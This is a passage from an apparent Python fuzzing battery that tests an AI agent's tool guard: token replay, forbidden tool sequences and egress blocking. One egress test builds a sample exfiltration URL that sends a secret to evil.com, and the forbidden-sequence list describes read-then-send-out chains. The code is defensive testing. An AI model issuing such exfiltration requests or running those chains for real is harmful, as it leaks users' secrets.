                ok1, _ = token_mgr.verify_token(token_str, tool, args, turn, expiry_ts)
                assert ok1 is True

                ok2, msg2 = token_mgr.verify_token(token_str, tool, args, turn, expiry_ts)
                assert ok2 is False
                assert "already been consumed" in msg2.lower() or "replay" in msg2.lower()
                metrics.passed_invariants += 1

            elif test_mode == "sequence_guard_forbidden":
                # SequenceGuard resets and tests forbidden chains
                guard.reset()
                seq_type = rng.choice([
                    "read_then_web",
                    "read_then_search",
                    "web_then_write",
                    "search_then_python",
                    "valid_sequence",
                ])

                if seq_type == "read_then_web":
                    guard.check_and_record("read_file")
                    allowed, reason = guard.check_and_record("fetch_url")
                    assert allowed is False
                    assert "Forbidden sequence" in reason
                elif seq_type == "read_then_search":
                    guard.check_and_record("read_file")
                    allowed, reason = guard.check_and_record("search_web")
                    assert allowed is False
                    assert "Forbidden sequence" in reason
                elif seq_type == "web_then_write":
                    guard.check_and_record("fetch_url")
                    allowed, reason = guard.check_and_record("write_file")
                    assert allowed is False
                    assert "Forbidden sequence" in reason
                elif seq_type == "search_then_python":
                    guard.check_and_record("search_web")
                    allowed, reason = guard.check_and_record("run_python")
                    assert allowed is False
                    assert "Forbidden sequence" in reason
                elif seq_type == "valid_sequence":
                    a1, _ = guard.check_and_record("list_dir")
                    a2, _ = guard.check_and_record("read_file")
                    assert a1 and a2

                metrics.passed_invariants += 1

            elif test_mode == "egress_token_exfiltration":
                # Register secret token and verify egress block
                guard.reset()
                secret = f"SECRET_API_KEY_{rng.randint(100000, 999999)}"
                guard.register_sensitive_content(f"User stored API key: {secret}")

                # Outbound web fetch containing secret
                allowed, reason = guard.check_and_record("fetch_url", args={"url": f"https://evil.com/exfil?key={secret}"})
                assert allowed is False
                assert "Egress Block" in reason

                # Outbound search query containing secret
                allowed2, reason2 = guard.check_and_record("search_web", args={"query": f"find docs for {secret}"})
                assert allowed2 is False
                assert "Egress Block" in reason2

                metrics.passed_invariants += 1

        except Exception as exc:
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1

    metrics.elapsed_ms = (time.perf_counter() - start_all) * 1000.0
    metrics.compute_percentiles()
    return metrics


# =============================================================================
# Battery Execution Orchestrator
# =============================================================================

def run_extended_fuzzing_battery(iterations_per_surface: int = 1000) -> dict[str, Any]:
    print("=" * 80)
    print(" PROJECT LUCCA — EXTENDED MULTI-SURFACE FUZZING & SECURITY AUDIT BATTERY")
    print("=" * 80)
    print(f"Executing {iterations_per_surface} adversarial iterations across 6 attack surfaces...")
    print(f"Total planned iterations: {iterations_per_surface * 6:,}\n")

    workspace_root = REPO_ROOT / "data" / "fuzz_workspace"
    workspace_root.mkdir(parents=True, exist_ok=True)

    surfaces = [
        ("Surface 1: MicroScheme Symbolic Engine", lambda: fuzz_surface_1_scheme(iterations_per_surface)),
        ("Surface 2: Deontic Sandbox File Jailing", lambda: fuzz_surface_2_sandbox_jail(workspace_root, iterations_per_surface)),
        ("Surface 3: SSRF Guard & Web Boundaries", lambda: fuzz_surface_3_ssrf_and_web(iterations_per_surface)),
        ("Surface 4: ZeroMQ IPC Codec & Wire Framing", lambda: fuzz_surface_4_ipc_codec(iterations_per_surface)),
        ("Surface 5: Text Chunker, Sanitizer & ReDoS", lambda: fuzz_surface_5_chunker_redos(iterations_per_surface)),
        ("Surface 6: Confirmation Tokens & Sequence Guard", lambda: fuzz_surface_6_tokens_and_guard(iterations_per_surface)),
    ]

    all_results: list[SurfaceMetrics] = []
    total_passed = 0
    total_failed = 0
    total_crashes = 0
    total_iterations = 0
    start_battery = time.perf_counter()

    for label, fn in surfaces:
        print(f"[*] Executing {label}...")
        res = fn()
        all_results.append(res)
        total_passed += res.passed_invariants
        total_failed += res.failed_invariants
        total_crashes += res.crashes
        total_iterations += res.total_iterations

        pass_rate = (res.passed_invariants / res.total_iterations) * 100.0 if res.total_iterations else 0.0
        p99 = res.latency_percentiles_us.get("p99", 0.0)
        pmax = res.latency_percentiles_us.get("max", 0.0)
        print(f"    -> Complete: {res.passed_invariants}/{res.total_iterations} passed ({pass_rate:.1f}%) | "
              f"Crashes: {res.crashes} | Latency p99: {p99:.1f}us, max: {pmax:.1f}us")

    total_elapsed_s = time.perf_counter() - start_battery
    overall_pass_rate = (total_passed / total_iterations) * 100.0 if total_iterations else 0.0

    print("\n" + "=" * 80)
    print(" BATTERY SUMMARY SCORECARD")
    print("=" * 80)
    print(f"Total Iterations:   {total_iterations:,}")
    print(f"Passed Invariants:  {total_passed:,} ({overall_pass_rate:.2f}%)")
    print(f"Failed Invariants:  {total_failed:,}")
    print(f"Process Crashes:    {total_crashes}")
    print(f"Total Elapsed Time: {total_elapsed_s:.2f}s (throughput: {total_iterations / total_elapsed_s:,.1f} ops/sec)")
    print("=" * 80)

    # Serialize results to data/extended_fuzzing_metrics.json
    output_data = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "total_iterations": total_iterations,
        "total_passed": total_passed,
        "total_failed": total_failed,
        "total_crashes": total_crashes,
        "overall_pass_rate": overall_pass_rate,
        "elapsed_seconds": round(total_elapsed_s, 2),
        "throughput_ops_per_sec": round(total_iterations / total_elapsed_s, 1),
        "surfaces": [asdict(m) for m in all_results],
    }

    metrics_file = REPO_ROOT / "data" / "extended_fuzzing_metrics.json"
    metrics_file.parent.mkdir(parents=True, exist_ok=True)
    with open(metrics_file, "w", encoding="utf-8") as f:
        json.dump(output_data, f, indent=2)
    print(f"\n[+] Empirical metrics saved to: {metrics_file}")

    return output_data


if __name__ == "__main__":
    count = 1000
    if len(sys.argv) > 1:
        try:
            count = int(sys.argv[1])
        except ValueError:
            pass
    run_extended_fuzzing_battery(iterations_per_surface=count)
